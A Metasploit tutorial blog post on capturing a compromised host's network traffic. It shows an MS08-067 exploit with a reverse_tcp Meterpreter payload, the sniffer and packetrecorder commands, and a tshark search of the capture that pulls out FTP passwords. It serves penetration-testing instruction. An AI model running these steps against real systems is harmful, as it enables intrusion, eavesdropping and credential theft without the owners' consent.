---
draft: false
title: MSF Packet Sniffing
linkTitle: Packet Sniffing
translationKey: msf-packet-sniffing
weight: 300
date: 2017-06-05T13:32:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: You may want to see the information sent and received by the target computer when you open a meterpreter shell on a target computer. 
url: /msf-packet-sniffing/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
---
## Packet Sniffing

When you open the meterpreter shell on a target computer using the Metasploit Framework, you may want to see the information sent and received during the communication made by the computer you are connected to on the network. This process is called **packet sniffing**.

You can record this traffic with the Meterpreter `sniffer` module. The `sniffer` module, which can record up to 200,000 packets in total, records the packets in PCAP format. Thus, you can analyze the PCAP file with `psnuffle, dsniff or wireshark` programs.

The Meterpreter `sniffer` plugin uses the MicroOLAP Packet Sniffer SDK. It does not send or receive data from any part of the disk to listen to the packets. In addition, it prevents confusion by keeping the packets created by meterpreter out of the record. The data captured by meterpreter is transferred to our computer encrypted using SSL/TLS.

## Let's Log In to Meterpreter

First, you should open a meterpreter session using a service or vulnerability you discovered. You can see an example below.

```bash
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpeter/reverse_tcp
msf exploit(ms08_067_netapi) > set LHOST 10.211.55.126
msf exploit(ms08_067_netapi) > set RHOST 10.10.1.119
msf exploit(ms08_067_netapi) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Triggering the vulnerability...
> Transmitting intermediate stager for **over-sized stage...(216 bytes)
> Sending stage (205824 bytes)
> Meterpreter session 1 opened (10.10.1.4:4444 -> 10.10.1.119:1921)
```

## Let's Load the Sinffer Module

When the Meterpreter session is opened, we need to activate the plugin with the `use sniffer` command. Then, when you give the `help` command, you can see the available commands related to `sniffer` in the help list.

```bash
meterpreter > use sniffer
Loading extension sniffer...success.

meterpreter > help

Sniffer Commands
**================**

     Command             Description
     -------             -----------
     sniffer_dump        Retrieve captured packet data
     sniffer_interfaces  List all remote sniffable interfaces
     sniffer_start       Capture packets on a previously opened interface
     sniffer_stats       View statistics of an active capture
     sniffer_stop        Stop packet captures on the specified interface
```

## Listenable Interfaces

To see which network interfaces are active on the target system, we examine the list using the `sniffer_interfaces` command.

```bash
meterpreter > sniffer_interfaces

1 - 'VMware Accelerated AMD PCNet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
```

## Start Listening

In our example, there is 1 interface. To listen to this network device, we give the `sniffer_start 1` command. The information will be saved to the `/tmp/all.cap` file.

```bash
meterpreter > sniffer_start 1
> Capture started on interface 1 (200000 packet buffer)
```

## Checking the Logs

While the listening process is in progress, you can use the `sniffer_dump` command to see how many packets were recorded and how many packets were written to the file.

```bash
meterpreter > sniffer_dump 1 /tmp/all.cap
> Dumping packets from interface 1...
> Wrote 19 packets to PCAP file /tmp/all.cap

meterpreter > sniffer_dump 1 /tmp/all.cap
> Dumping packets from interface 1...
> Wrote 199 packets to PCAP file /tmp/all.cap
```

## packetrecorder Plugin

In addition to the Meterpreter `sniffer` plugin, you can also use the `packetrecorder` script codes developed for packet listening. This module allows you to divide packet records into specific time intervals. For example, you may want to record at 30-second intervals.

Let's Activate ### packetrecorder

```bash
meterpreter > run packetrecorder
Meterpreter Script for **capturing packets **in **to a PCAP file
on a target host given an interface ID.

OPTIONS:

 -h Help menu.
 -i Interface ID number where all packet capture will be **done**.
 -l Specify and alternate folder to save PCAP file.
 -li List interfaces that can be used for **capture.
 -t Time interval **in **seconds between recollection of packet, default 30 seconds.
```

Before we start listening, let's check the list of listenable interfaces.

```bash
meterpreter > run packetrecorder -li

1 - 'Realtek RTL8139 Family PCI Fast Ethernet NIC' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
2 - 'Citrix XenServer PV Ethernet Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
3 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
```

In this example, we see that there are 3 network devices. With the `-i 2` option, we specify that we will listen to interface number 2. With the `-l /root/` option, we specify where the PCAP file will be saved. After the listening starts, you can use the `CTRL+C` keys to finish the process after a while.

```bash
meterpreter > run packetrecorder -i 2 -l /root/
> Starting Packet capture on interface 2
[+] Packet capture started
> Packets being saved **in **to /root/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105/XEN-XP-SP2-BARE_20101119.5105.cap
> Packet capture interval is 30 Seconds
^C
> Interrupt
[+] Stopping Packet sniffer...
meterpreter >
```

You can analyze the recorded PCAP file with `wireshark` or `tshark` programs. Below is an example of the `tshark` command. The example command searches for packets that contain the `PASS` statement in the packets.

```bash
root@kali:~/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105# tshark -r XEN-XP-SP2-BARE_20101119.5105.cap |grep PASS
Running as user "root" and group "root". This could be dangerous.
2489 82.000000 192.168.1.201 -> 209.132.183.61 FTP Request: PASS s3cr3t
2685 96.000000 192.168.1.201 -> 209.132.183.61 FTP Request: PASS s3cr3t```
